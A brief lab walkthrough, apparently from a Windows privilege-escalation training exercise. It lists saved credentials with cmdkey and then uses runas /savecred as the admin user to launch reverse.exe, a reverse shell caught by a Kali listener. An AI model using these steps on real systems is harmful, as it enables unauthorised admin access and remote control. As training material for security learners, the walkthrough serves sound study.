1. List any saved credentials:

```
cmdkey /list
```

> [!NOTE]
> Credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.

2. Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:
```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```
